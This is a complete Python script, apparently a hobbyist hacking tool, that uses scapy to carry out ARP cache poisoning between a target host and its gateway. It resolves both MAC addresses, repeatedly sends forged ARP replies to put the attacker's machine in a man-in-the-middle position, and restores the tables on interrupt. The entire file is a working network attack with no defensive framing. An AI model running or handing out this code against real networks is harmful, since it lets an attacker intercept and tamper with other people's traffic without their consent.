import scapy.all as scapy
import optparse
import time

def input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--targetip", dest="ip", help="Target IP address")
    parse_object.add_option("-g", "--gatewayip", dest="target_ip", help="Gateway IP address")

    (user_input, arguments) = parse_object.parse_args()
    if not user_input.ip:
        print("Please enter target IP address")
    if not user_input.target_ip:
        print("Please enter gateway IP address")
    return user_input

def get_mac_addr(ip):
    arp_request_pack = scapy.ARP(pdst=ip)
    broadcast_pack = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_pack = broadcast_pack/arp_request_pack
    answered_list = scapy.srp(combined_pack, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_addr(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)
    # scapy.ls(scapy.ARP())

def arp_reset(fooled, gateway):
    fooled_mac = get_mac_addr(fooled)
    gateway_mac = get_mac_addr(gateway)
    arp_response = scapy.ARP(op=2, pdst=fooled, hwdst=fooled_mac, psrc=gateway, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)

user_input = input()
number = 0

try:
    while True:
        arp_poisoning(user_input.ip, user_input.target_ip)
        arp_poisoning(user_input.target_ip, user_input.ip)
        number += 2
        print("\rSending packets " + str(number), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuitting & Resetting")
    arp_reset(user_input.ip, user_input.target_ip)
    arp_reset(user_input.target_ip, user_input.ip)